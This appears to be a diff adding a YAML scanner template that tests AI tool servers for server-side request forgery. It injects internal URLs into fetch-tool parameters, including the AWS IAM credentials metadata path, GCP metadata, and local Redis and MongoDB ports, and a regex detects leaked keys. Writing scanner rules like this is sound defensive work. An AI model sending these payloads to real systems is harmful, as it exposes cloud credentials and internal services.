@@ -1,0 +1,33 @@
+version: "1"
+name: "tool-ssrf"
+severity: high
+description: >
+  Inject internal network URLs into the URL parameter of HTTP-fetching tools.
+  Uses ${matched_param} to adapt to any parameter name (url, uri, endpoint,
+  target, href, link, address, etc.).
+
+requires:
+  tools:
+    - "fetch|http_get|web_fetch|request|get_url|httpGet|webFetch|browse|scrape"
+  inject_into: "url|uri|endpoint|target|href|link|address|src|host"
+
+steps:
+  - id: probe_ssrf
+    type: mutate
+    method: tools/call
+    params:
+      name: "${matched_tool}"
+      arguments:
+        "${matched_param}": "${payload}"
+    payloads:
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "http://metadata.google.internal/computeMetadata/v1/"
+      - "http://localhost/"
+      - "http://127.0.0.1/"
+      - "http://127.0.0.1:6379/"
+      - "http://127.0.0.1:27017/"
+    matchers:
+      - type: jsonrpc_success
+      - type: regex
+        pattern: "(ami-id|instance-id|AccessKeyId|computeMetadata|DOCTYPE html|redis_version|MongoDB)"
